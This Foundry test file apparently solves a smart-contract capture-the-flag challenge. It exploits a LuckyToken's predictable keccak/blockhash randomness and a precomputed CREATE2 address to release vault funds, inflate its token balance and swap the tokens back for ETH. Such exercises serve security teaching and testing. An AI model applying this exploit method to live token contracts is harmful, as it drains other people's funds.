// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {LuckyToken} from "../src/LuckyToken.sol";
import {TeamVault} from "../src/TeamVault.sol";
import "../src/interfaces/IUniswapV2Router02.sol";
import "../src/LockStaking.sol";
import "../src/interfaces/IUniswapV2Pair.sol";
import "../src/Challenge.sol";

contract LuckyTokenTest is Test {

    LuckyToken token;
    Challenge challenge;
    TeamVault vault;
    IUniswapV2Router02 router =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    function test_challenge() public {
        vm.deal(address(0xdeadbeef), 10 ether);
        vm.prank(address(0xdeadbeef));
        challenge = new Challenge{value: 10 ether}(address(this));
        token = challenge.TOKEN();
        vault = token.teamVault();

        console.log(challenge.isSolved());

        //vm.startPrank(challenge.PLAYER());

        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(token);
        router.swapExactETHForTokens{value: 1 ether}( 
            0,
            path,
            address(this),
            block.timestamp
        );

        for (uint i = 0; i < 11; i++) {
            token.transfer(address(this), 1);
        }

        bytes32 stakingCodeHash = keccak256(abi.encodePacked(
            type(LockStaking).creationCode,
            abi.encode(address(token), uint256(12))
        ));
        uint nonceCached = token.nonce();

        ReleaseCaller rc = new ReleaseCaller(vault);
        bytes32 salt = bytes32(uint256(uint160(address(rc))));
        address precomputeStaking = address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xff), address(vault), salt, stakingCodeHash
        )))));
        token.transfer(precomputeStaking, 2);
        
        for (uint160 i = 100; i < 110; i++) {

            token.transfer(address(this), 1);

            uint256 nonce = uint256(
                keccak256(
                    abi.encodePacked(
                        precomputeStaking,
                        precomputeStaking,
                        block.timestamp,
                        uint256(1000000000000000000000000),
                        token.nonce(),
                        blockhash(block.number - 1)
                    )
                )
            );

            bool status = ((nonce % 101) & 1) == 0;
            if (!status) {
                rc.release();
                break;
            }
        }

        nonceCached = token.nonce();
        for (uint i = 0; i < 10; i++) {
            uint256 jkl1 = uint256(
                keccak256(
                    abi.encodePacked(
                        address(this),
                        address(this),
                        block.timestamp,
                        token.balanceOf(address(this)) - 1 - i,
                        nonceCached,
                        blockhash(block.number - 1)
                    )
                )
            );
            bool status = ((jkl1 % 101) & 1) == 0;
            if (status) {
                    token.transfer(address(this), token.balanceOf(address(this)) - 1 - i);

                    i = 0;
                    nonceCached = token.nonce();
                    if (token.balanceOf(address(this)) > 100e18) {
                        break;
                    }
            }
        }

        token.approve(address(router), type(uint).max);
        path[0] = address(token);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            token.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp + 1000
        );

        console.log(challenge.isSolved());
        require(challenge.isSolved());
    }

    receive() external payable {}
}

contract ReleaseCaller {

    TeamVault public immutable TEAM_VAULT;

    constructor(TeamVault team_vault) {
        TEAM_VAULT = team_vault;
    }

    function release() external {
        TEAM_VAULT.release();
    }
}